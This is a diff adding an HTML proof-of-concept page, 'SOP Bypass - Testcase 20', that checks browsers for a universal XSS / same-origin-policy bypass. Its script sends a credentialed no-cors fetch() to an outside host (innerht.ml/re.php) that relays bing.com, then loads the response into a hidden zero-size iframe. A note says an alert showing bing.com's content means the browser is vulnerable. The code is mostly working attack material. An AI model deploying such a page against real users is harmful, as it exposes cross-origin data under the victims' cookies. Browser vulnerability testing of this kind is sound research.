@@ -1,0 +1,94 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+
+
+
+ <iframe src='' id='test' width=0 height=0></iframe>
+  <iframe src='//bing.com' width=0 height=0></iframe>
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 20</h3>	
+
+		<div class="main">
+				<p>This test case is based upon GlobalFetch.fetch() which is supported by Firefox, Chrome at the time of writing</p>
+		</div>
+<script> 
+
+function myfunction(){
+var myImage = document.getElementById('test');
+x=fetch('http://innerht.ml/re.php?xss=//bing.com',{mode:'no-cors',credentials: 'include'}).then(function(response) {
+  return response.blob();
+}).then(function(response) {console.dir(res2=response);
+  var objectURL = URL.createObjectURL(response);
+  myImage.src = objectURL;
+});
+
+}
+
+</script>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunction()" /></center>
+
+		
+
+
+ 
+ 
+
+		</br></br>
+			<div class="note">
+		
+				<p><strong>Note:</strong> <br />
+					If page displays an alert displaying innerHTML property of bing.com, your browser is vulnerable to SOP bypass "</br>
+					
+					Reference: http://leucosite.com/FireFox-Same-Origin-Policy-Bypass/
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
